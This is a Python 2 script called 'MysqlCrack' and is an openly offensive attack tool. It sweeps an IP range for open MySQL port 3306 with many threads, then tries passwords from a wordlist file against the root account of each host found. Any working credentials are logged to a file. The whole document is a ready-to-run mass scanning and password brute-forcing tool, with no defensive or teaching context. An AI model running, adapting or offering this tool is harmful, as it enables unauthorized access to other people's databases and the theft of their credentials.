#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Mysql Carck
# Scan 3306
import threading
import argparse
import socket
import Queue
import netaddr
import MySQLdb
import time
import sys
class MysqlCrack:
    def __init__(self,address,tnum):
        self.scanque = Queue.Queue()
        self.tnum = tnum
        self.tmpnum = tnum
        self.lock = threading.Lock()
        self.openlist = []
        if address.find("-") != -1:
            for ip in netaddr.IPRange(address.split("-")[0],address.split("-")[1]):
                self.scanque.put(ip)
        else:
            for ip in netaddr.IPNetwork(address).iter_hosts():
                self.scanque.put(ip)
        self.qsize = self.scanque.qsize()
        for i in range(tnum):
            t = threading.Thread(target=self.ScanPort)
            t.setDaemon(True)
            t.start()
        while self.tmpnum > 0:
            time.sleep(1.0)
        print "[*]InFo:cracking MySQL Password"
        with open("pass.txt","r") as file:
            data = file.readlines()
        for ip in self.openlist:
            for line in data:
                self.scanque.put(line.strip())
            for i in range(tnum):
                t = threading.Thread(target=self.Crack,args=(ip,))
                t.setDaemon(True)
                t.start()
            while self.scanque.qsize() > 0:
                time.sleep(1.0)

    def Crack(self,ip):
        while self.scanque.qsize() > 0:
            try:
                password = self.scanque.get()
                conn=MySQLdb.connect(host=ip,user='root',passwd=password,db='mysql',port=3306,connect_timeout=0)
                self.lock.acquire()
                msg = "[+]InFo: %s Username: root Password is: %s" %(ip,password)
                print msg
                output = open('good.txt', 'a')
                output.write(msg + "\r\n")
                self.lock.release()
                break
            except:
				print "[*]InFo: On"

    def ScanPort(self):
        while self.scanque.qsize() > 0:
            try:
                ip = self.scanque.get()
                s = socket.socket()
                s.settimeout(4)
                s.connect((str(ip), 3306))
                self.lock.acquire()
                print "[*]InFo: ",ip," 3306 open"
                self.openlist.append(str(ip))
                self.lock.release()
            except:
                pass
        self.tmpnum -= 1
if __name__ == "__main__":
    parse = argparse.ArgumentParser(description="MysqlCrack")
    parse.add_argument('-a','--address', type=str, help="ipaddress")
    parse.add_argument('-t','--thread' , type=int, help=" Thread Number",default=100)
    args = parse.parse_args()
    if not args.address:
        parse.print_help()
        sys.exit(0)
    address = args.address
    tnum = args.thread
    MysqlCrack(address,tnum)
